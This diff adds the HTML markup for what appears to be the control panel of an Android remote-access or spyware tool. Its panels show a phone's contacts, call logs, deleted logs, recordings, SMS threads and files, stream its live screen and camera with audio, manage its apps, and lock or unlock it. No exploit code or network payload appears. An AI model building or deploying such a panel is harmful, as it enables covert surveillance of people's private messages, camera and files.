@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Admin Panel</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>📱 Device Admin Panel</h1>
+            
+            <div class="status" id="headerStatus">● Checking...</div>
+
+            <div class="status-badge" id="deviceStatusBadge">
+                ○ No Devices
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <h2 class="section-title">Registered Devices</h2>
+
+            <div class="content-wrapper" id="devicesContainer">
+                <!-- Devices will be dynamically added here -->
+                <div class="no-devices-message">
+                    <div style="font-size: 64px; margin-bottom: 20px;">📱</div>
+                    <h3>No Devices Connected</h3>
+                    <p>Waiting for devices to register...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 🔥 CONTACTS & CALL LOGS POPUP -->
+    <div id="callLogsPopup" class="popup-overlay" style="display:none;">
+        <div class="popup-container">
+            
+            <!-- Header -->
+            <div class="popup-header">
+                <div class="header-left">
+                    <span class="header-icon">📞</span>
+                    <h2>Contacts & Call Logs</h2>
+                </div>
+                <div class="header-right">
+                    <span class="status-badge-live">● Live</span>
+                    <span class="last-updated">Updated: <span id="lastUpdatedTime">--</span></span>
+                    <button class="back-btn" onclick="closeCallLogs()">⬅ Back to Devices</button>
+                </div>
+            </div>
+
+            <!-- Device Selector -->
+            <div class="device-selector">
+                <label>Select Device:</label>
+                <select id="deviceSelect">
+                    <!-- Options will be populated dynamically -->
+                </select>
+            </div>
+
+            <!-- Stats Cards -->
+            <div class="stats-container">
+                <div class="stat-card stat-blue">
+                    <div class="stat-number" id="totalContacts">0</div>
+                    <div class="stat-label">Total Contacts</div>
+                </div>
+                <div class="stat-card stat-green">
+                    <div class="stat-number" id="incomingCalls">0</div>
+                    <div class="stat-label">Incoming Calls</div>
+                </div>
+                <div class="stat-card stat-blue-light">
+                    <div class="stat-number" id="outgoingCalls">0</div>
+                    <div class="stat-label">Outgoing Calls</div>
+                </div>
+                <div class="stat-card stat-red">
+                    <div class="stat-number" id="missedCalls">0</div>
+                    <div class="stat-label">Missed Calls</div>
+                </div>
+
+                <div class="stat-card stat-rad">
+                    <div class="stat-number" id="deleteCalllogs">0</div>
+                    <div class="stat-label">Delete Call Logs</div>
+                </div>
+
+                <div class="stat-card stat-recording">
+                    <div class="stat-number" id="callRecording">0</div>
+                    <div class="stat-label">Call Recording</div>
+                </div>
+            </div>
+
+            <!-- Tabs -->
+            <div class="popup-tabs">
+                <button class="tab-btn" onclick="showPopupTab('contacts')">📇 Contacts</button>
+                <button class="tab-btn active" onclick="showPopupTab('callLogs')">📞 Call Logs</button>
+                <button class="tab-btn" onclick="showPopupTab('deletelogs')">🗑️ Delete Call Logs</button>
+            </div>
+
+            <!-- Search Bar -->
+            <div class="search-bar">
+                <input type="text" id="searchInput" placeholder="🔍 Search call logs by name or number..." />
+            </div>
+
+            <!-- Data Table -->
+            <div class="data-table-container">
+                
+                <!-- Contacts Tab -->
+                <div id="contactsTab" style="display:none;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Name</th>
+                                <th>Phone Number</th>
+                            </tr>
+                        </thead>
+                        <tbody id="popupContactsList">
+                            <tr><td colspan="2" style="text-align:center; padding:40px; color:#999;">Loading contacts...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- Call Logs Tab -->
+                <div id="callLogsTab" style="display:none;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Name</th>
+                                <th>Phone Number</th>
+                                <th>Type</th>
+                                <th>Date & Time</th>
+                                <th>Duration</th>
+                                <th>Call Recording</th>
+                            </tr>
+                        </thead>
+                        <tbody id="popupCallLogs">
+                            <tr><td colspan="6" style="text-align:center; padding:40px; color:#999;">Loading call logs...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- Delete Call Logs Tab -->
+                <div id="deletelogsTab" style="display:none;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Name</th>
+                                <th>Phone Number</th>
+                                <th>Type</th>
+                                <th>Date & Time</th>
+                                <th>Duration</th>
+                                <th>Deleted At</th>
+                            </tr>
+                        </thead>
+                        <tbody id="popupDeleteLogs">
+                            <tr><td colspan="6" style="text-align:center; padding:40px; color:#999;">Loading deleted call logs...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+            </div>
+
+            <!-- Footer Button -->
+            <div class="popup-footer">
+                <button class="update-btn" onclick="refreshCallLogs()">🔄 Refresh Call Logs</button>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- 🔥 FILE MANAGER POPUP -->
+    <div id="fileManagerPopup" class="popup-overlay" style="display:none;">
+        <div class="popup-container">
+            
+            <!-- Header -->
+            <div class="popup-header file-manager-header">
+                <div class="header-left">
+                    <span class="header-icon">📁</span>
+                    <h2>Remote File Manager</h2>
+                </div>
+                <div class="header-right">
+                    <select id="fileManagerDeviceSelect" class="device-dropdown-header">
+                        <!-- Options will be populated dynamically -->
+                    </select>
+                    <button class="back-btn" onclick="closeFileManager()">✖ Close</button>
+                </div>
+            </div>
+
+            <!-- Main Content Area -->
+            <div class="file-manager-content">
+                
+                <!-- Left Sidebar -->
+                <div class="file-sidebar">
+                    <div class="sidebar-section">
+                        <h3 class="sidebar-title">QUICK ACCESS</h3>
+                        <div class="sidebar-item active" onclick="navigateToPath('/sdcard')">
+                            <span class="sidebar-icon">🏠</span>
+                            <span>Home</span>
+                        </div>
+                        <div class="sidebar-item" onclick="navigateToPath('/storage/emulated/0')">
+                            <span class="sidebar-icon">💾</span>
+                            <span>Internal Storage</span>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section">
+                        <h3 class="sidebar-title">GALLERY</h3>
+                        <div class="sidebar-item" onclick="navigateToPath('/sdcard/DCIM')">
+                            <span class="sidebar-icon">🖼️</span>
+                            <span>All Media</span>
+                        </div>
+                        <div class="sidebar-item" onclick="navigateToPath('/sdcard/Pictures')">
+                            <span class="sidebar-icon">📷</span>
+                            <span>Images</span>
+                        </div>
+                        <div class="sidebar-item" onclick="navigateToPath('/sdcard/Movies')">
+                            <span class="sidebar-icon">🎥</span>
+                            <span>Videos</span>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section">
+                        <h3 class="sidebar-title">DOCUMENTS</h3>
+                        <div class="sidebar-item" onclick="navigateToPath('/sdcard/Download')">
+                            <span class="sidebar-icon">⬇️</span>
+                            <span>Downloads</span>
+                        </div>
+                        <div class="sidebar-item" onclick="navigateToPath('/sdcard/Documents')">
+                            <span class="sidebar-icon">📄</span>
+                            <span>Documents</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Content Area -->
+                <div class="file-main-area">
+                    
+                    <!-- Top Action Bar -->
+                    <div class="file-action-bar">
+                        <div class="breadcrumb">
+                            <span class="breadcrumb-item">Home</span>
+                        </div>
+                        <div class="action-buttons-right">
+                            <button class="file-action-btn" onclick="toggleView('grid')">
+                                <span>▦</span> Grid
+                            </button>
+                            <button class="file-action-btn active" onclick="toggleView('list')">
+                                <span>☰</span> List
+                            </button>
+                            <button class="file-action-btn" onclick="createNewFolder()">
+                                <span>📁</span> New Folder
+                            </button>
+                            <button class="file-action-btn upload-btn" onclick="document.getElementById('fileUploadInput').click()">
+                                <span>⬆</span> Upload
+                            </button>
+                            <button class="file-action-btn" onclick="refreshFiles()">
+                                <span>🔄</span> Refresh
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- File Drop Zone -->
+                    <div class="file-drop-zone" id="fileDropZone">
+                        <div class="drop-zone-content">
+                            <div class="drop-icon">📦</div>
+                            <h3>Drag & Drop files here</h3>
+                            <p>or click to browse</p>
+                            <input type="file" id="fileUploadInput" multiple style="display:none;" onchange="handleFileUpload(event)">
+                        </div>
+                    </div>
+
+                    <!-- File Browser Area -->
+                    <div class="file-browser" id="fileBrowser">
+                        <div class="file-loading">
+                            <div class="loading-spinner"></div>
+                            <p>Select a location to browse files</p>
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+<div id="actionPopup" style="display:none; position:absolute; width:220px; min-height:300px; background:#1a1c2c; color:white; z-index:9999; border-radius:8px; flex-direction:column; box-shadow:8px 0 20px rgba(0,0,0,0.4); border:1px solid #3498db; overflow:hidden;">
+    <div style="padding:12px; background:#2c3e50; border-bottom:2px solid #3498db; display:flex; justify-content:space-between; align-items:center;">
+        <span style="font-weight:bold; font-size:12px; color:#3498db;">ACTION WINDOW</span>
+        <button onclick="closeActionPopup()" style="background:none; border:none; color:#95a5a6; cursor:pointer; font-size:18px;">&times;</button>
+    </div>
+    <div style="padding:8px 12px; background:rgba(52, 152, 219, 0.1); border-bottom:1px solid #2c3e50;">
+        <span id="popupDeviceName" style="font-size:11px; color:#bdc3c7;">Device Name</span>
+    </div>
+    <div style="padding:15px; flex-grow:1; display:flex; flex-direction:column; gap:10px;">
+        <button id="sideLiveBtn" style="width:100%; padding:10px; background:#27ae60; color:white; border:none; border-radius:5px; font-weight:600; cursor:pointer; font-size:12px; display:flex; align-items:center; gap:8px;">
+            <span>📺</span> Live Screen
+        </button>
+        <button id="sideCameraBtn" onclick="startLiveCamera()" style="width:100%; padding:10px; background:#e74c3c; color:white; border:none; border-radius:5px; font-weight:600; cursor:pointer; font-size:12px; display:flex; align-items:center; gap:8px;">
+            <span>📷</span> Live Camera
+        </button>
+        <button class="file-action-btn install-app-btn" onclick="openInstalledApps(currentActiveDeviceId)">
+            <span>📦</span> Install App
+        </button>
+        <button id="sideSmsBtn" onclick="openSmsPopup(currentActiveDeviceId)">
+            <span>💬</span> SMS Messages
+        </button>
+    </div>
+</div><!-- /#actionPopup -->
+
+
+<div id="installedAppsPopup" class="popup-overlay" style="display:none;">
+    <div class="popup-container">
+        <div class="popup-header file-manager-header">
+            <div class="header-left"><span class="header-icon">📦</span><h2>Installed Apps</h2></div>
+            <div class="header-right">
+                <select id="appsDeviceSelect" class="device-dropdown-header" onchange="fetchInstalledApps(this.value)"></select>
+                <button class="back-btn" onclick="closeInstalledApps()">&#x2716; Close</button>
+            </div>
+        </div>
+        <div class="apps-stats-bar">
+            <div class="apps-stat-item"><span class="apps-stat-number" id="totalAppsCount">0</span><span class="apps-stat-label">Total</span></div>
+            <div class="apps-stat-item"><span class="apps-stat-number" id="userAppsCount">0</span><span class="apps-stat-label">User</span></div>
+            <div class="apps-stat-item"><span class="apps-stat-number" id="systemAppsCount">0</span><span class="apps-stat-label">System</span></div>
+            <div class="apps-search-wrap"><input type="text" id="appsSearchInput" placeholder="&#128269; App naam ya package..." oninput="filterApps(this.value)" /></div>
+            <div class="apps-view-toggle">
+                <button id="appsListViewBtn" class="apps-toggle-btn active" onclick="switchAppsView('list')">&#9776; List</button>
+                <button id="appsGridViewBtn" class="apps-toggle-btn" onclick="switchAppsView('grid')">&#9638; Grid</button>
+            </div>
+        </div>
+        <div class="popup-tabs">
+            <button class="tab-btn active" onclick="showAppsTab('all')">&#128203; All Apps</button>
+            <button class="tab-btn" onclick="showAppsTab('user')">&#128100; User</button>
+            <button class="tab-btn" onclick="showAppsTab('system')">&#9881; System</button>
+        </div>
+        <div class="data-table-container" id="appsContentArea">
+            <div id="appsListView">
+                <div id="appsAllTab">
+                    <table class="data-table"><thead><tr><th>Icon</th><th>App Name</th><th>Package</th><th>Version</th><th>Type</th></tr></thead>
+                    <tbody id="appsTableBody"><tr><td colspan="5" class="apps-empty-msg">Device select karo...</td></tr></tbody></table>
+                </div>
+                <div id="appsUserTab" style="display:none;">
+                    <table class="data-table"><thead><tr><th>Icon</th><th>App Name</th><th>Package</th><th>Version</th></tr></thead>
+                    <tbody id="userAppsTableBody"><tr><td colspan="4" class="apps-empty-msg">No user apps.</td></tr></tbody></table>
+                </div>
+                <div id="appsSystemTab" style="display:none;">
+                    <table class="data-table"><thead><tr><th>Icon</th><th>App Name</th><th>Package</th><th>Version</th></tr></thead>
+                    <tbody id="systemAppsTableBody"><tr><td colspan="4" class="apps-empty-msg">No system apps.</td></tr></tbody></table>
+                </div>
+            </div>
+            <div id="appsGridView" style="display:none;">
+                <div id="appsGridAll"    class="apps-grid"></div>
+                <div id="appsGridUser"   class="apps-grid" style="display:none;"></div>
+                <div id="appsGridSystem" class="apps-grid" style="display:none;"></div>
+            </div>
+        </div>
+        <div class="popup-footer">
+            <button class="update-btn" onclick="refreshInstalledApps()">&#128260; Refresh</button>
+        </div>
+    </div>
+</div>
+
+<!-- APP CONTEXT MENU -->
+<div id="appCtxOverlay" style="display:none;" onclick="closeAppContextMenu()"></div>
+<div id="appContextMenu" style="display:none;">
+    <div class="app-ctx-header">
+        <div class="app-ctx-icon" id="ctxAppIcon"></div>
+        <div class="app-ctx-info">
+            <div class="app-ctx-name" id="ctxAppName"></div>
+            <div class="app-ctx-pkg"  id="ctxAppPkg"></div>
+            <span id="ctxDisabledBadge" style="display:none;margin-top:4px;padding:2px 7px;background:#c0392b33;color:#e74c3c;border-radius:4px;font-size:10px;font-weight:700;">DISABLED</span>
+        </div>
+    </div>
+    <div class="app-ctx-actions">
+        <button class="app-ctx-btn ctx-open"      onclick="appAction('open')">&#9654;&#65039; Open App</button>
+        <button class="app-ctx-btn ctx-uninstall" onclick="appAction('uninstall')">&#128465; Uninstall App</button>
+        <button class="app-ctx-btn ctx-disable"   onclick="appAction('disable')">&#128683; Disable App</button>
+        <button class="app-ctx-btn ctx-enable"    onclick="appAction('enable')">&#9989; Enable App</button>
+    </div>
+    <button class="app-ctx-close" onclick="closeAppContextMenu()">&#x2716; Close</button>
+</div>
+
+<div id="liveScreenMobilePopup" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:320px; height:640px; z-index:100000; justify-content:center; align-items:center;">
+    
+    <div style="width:100%; height:100%; background:#000; border:10px solid #333; border-radius:40px; position:relative; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 15px 50px rgba(0,0,0,0.6);">
+        
+        <div style="background:#1a1c2c; padding:20px 10px 10px; text-align:center; border-bottom:1px solid #333; position:relative; z-index:10;">
+            <span id="liveMobileDeviceName" style="color:#27ae60; font-size:10px; font-weight:bold; text-transform:uppercase;">DEVICE</span>
+        </div>
+
+        <div style="flex:1; background:#111; display:flex; justify-content:center; align-items:center; overflow:hidden;">
+            <img id="liveStreamView" src="" alt="Waiting..." style="max-width:100%; height:auto;">
+        </div>
+
+        <div style="padding:15px; background:#1a1c2c; text-align:center; border-top:1px solid #333;">
+            <button onclick="stopLiveStream()" style="background:#e74c3c; color:white; border:none; padding:10px; border-radius:20px; width:80%; cursor:pointer; font-weight:bold; box-shadow:0 4px 10px rgba(231, 76, 60, 0.3);">STOP</button>
+        </div>
+    </div>
+
+
+    <!-- Right side — Lock/Unlock buttons -->
+    <div style="position:absolute; left:330px; top:50%; transform:translateY(-50%); display:flex; flex-direction:column; gap:12px;">
+        <button onclick="sendPhoneCommand('UNLOCK_PHONE')" 
+            style="background:#27ae60; color:white; border:none; padding:12px 14px; border-radius:10px; cursor:pointer; font-weight:bold; font-size:12px; white-space:nowrap; box-shadow:0 4px 15px rgba(39,174,96,0.4);">
+            🔓 Unlock
+        </button>
+        <button onclick="sendPhoneCommand('LOCK_PHONE')" 
+            style="background:#e67e22; color:white; border:none; padding:12px 14px; border-radius:10px; cursor:pointer; font-weight:bold; font-size:12px; white-space:nowrap; box-shadow:0 4px 15px rgba(230,126,34,0.4);">
+            🔒 Lock
+        </button>
+    </div>
+
+</div>
+    <!-- ✅ FIX: Missing overlay div for live screen background -->
+    <div id="liveScreenOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:99999;"></div>
+
+    <!-- ✅ FIX: Missing waiting overlay shown before first frame arrives -->
+    <div id="liveWaitingOverlay" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); z-index:100001; background:rgba(0,0,0,0.85); color:white; padding:30px 40px; border-radius:12px; text-align:center;">
+        <div style="font-size:40px; margin-bottom:10px;">📡</div>
+        <p style="margin:0; font-size:14px;">Waiting for screen stream...</p>
+    </div>
+
+    <!-- ===== LIVE CAMERA OVERLAY ===== -->
+<div id="liveCameraOverlay" class="camera-overlay" onclick="if(event.target===this) stopLiveCamera();">
+
+    <div id="liveCameraPopup" class="camera-popup">
+
+        <!-- HEADER -->
+        <div class="camera-header">
+            <div class="camera-title">
+                <span class="camera-icon">📷</span>
+                <h2>Live Camera</h2>
+                <span class="camera-live-dot"></span>
+            </div>
+
+            <div class="camera-controls">
+
+                <!-- Mic Toggle Button -->
+                <button id="cameraMicBtn" onclick="toggleCameraMic()" class="camera-mic-btn mic-muted" title="Mic Muted">
+                    <span id="cameraMicIcon">🔇</span>
+                    <span id="cameraMicLabel">Muted</span>
+                </button>
+
+                <!-- FPS Slider -->
+                <div class="camera-control-group">
+                    <span class="control-label">FPS</span>
+                    <input type="range" id="cameraFpsSlider"
+                        min="10" max="60" value="15" step="5"
+                        oninput="setCameraFps(this.value)"
+                        class="camera-slider fps-slider">
+                    <span id="cameraFpsValue" class="control-value">15</span>
+                </div>
+
+                <!-- Quality Slider -->
+                <div class="camera-control-group">
+                    <span class="control-label">Quality</span>
+                    <input type="range" id="cameraQualSlider"
+                        min="20" max="100" value="70" step="10"
+                        oninput="setCameraQuality(this.value)"
+                        class="camera-slider qual-slider">
+                    <span id="cameraQualValue" class="control-value">70%</span>
+                </div>
+
+                <!-- Switch Camera -->
+                <button onclick="switchCamera()" class="camera-switch-btn">
+                    🔄 <span id="cameraFaceLabel">BACK</span>
+                </button>
+
+                <!-- Close -->
+                <button onclick="stopLiveCamera()" class="back-btn">✖ Close</button>
+
+            </div>
+        </div>
+
+        <!-- CAMERA FEED -->
+        <div class="camera-feed">
+            <img id="liveCameraImg" src="" alt="" class="camera-img">
+
+            <!-- Waiting overlay -->
+            <div id="cameraWaiting" class="camera-waiting">
+                <div class="camera-waiting-icon">📷</div>
+                <p>Connecting to camera...</p>
+            </div>
+        </div>
+
+    </div>
+</div>
+ 
+
+
+<!-- ===== SMS POPUP ===== -->
+<div id="smsPopup" class="popup-overlay" style="display:none;">
+    <div class="sms-popup-wrapper">
+           <button class="sms-toggle-btn" id="smsToggleBtn" onclick="toggleSmsFullscreen()">
+               <span class="btn-icon">✖</span>
+            </button>
+
+        <!-- LEFT PANEL: Thread List -->
+        <div class="sms-left-panel" id="smsLeftPanel">
+            <div class="sms-left-header">
+                <h2>💬 SMS Messages</h2>
+            
+            </div>
+
+            <div class="sms-device-bar">
+                <select id="smsDeviceSelect" class="sms-device-select" onchange="fetchSms(this.value)"></select>
+            </div>
+
+            <div class="sms-search-wrap">
+                <input type="text" id="smsSearchInput" placeholder="🔍 Search by name, number or message..." oninput="filterSmsThreads(this.value)" />
+            </div>
+
+            <div class="sms-thread-list" id="smsThreadList">
+                <div class="sms-loading">
+                    <div class="loading-spinner"></div>
+                    <p>Loading messages...</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- RIGHT PANEL: Chat View -->
+        <div class="sms-right-panel" id="smsRightPanel">
+            <div class="sms-no-chat" id="smsNoChat">
+                <div class="sms-no-chat-icon">💬</div>
+                <h3>Select a conversation</h3>
+                <p>Choose a contact from the list to view messages</p>
+            </div>
+
+            <div class="sms-chat-header" id="smsChatHeader" style="display:none;">
+                <div class="sms-chat-avatar" id="smsChatAvatar">?</div>
+                <div class="sms-chat-info">
+                    <div class="sms-chat-name" id="smsChatName"></div>
+                    <div class="sms-chat-number" id="smsChatNumber"></div>
+                </div>
+                <button class="sms-refresh-chat-btn" onclick="refreshSmsCurrent()">🔄 Refresh</button>
+                <button class="sms-close-btn" onclick="closeSmsPopup()">✖</button>
+            </div>
+
+            <div class="sms-messages-area" id="smsMessagesArea" style="display:none;"></div>
+        </div>
+
+    </div>
+</div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
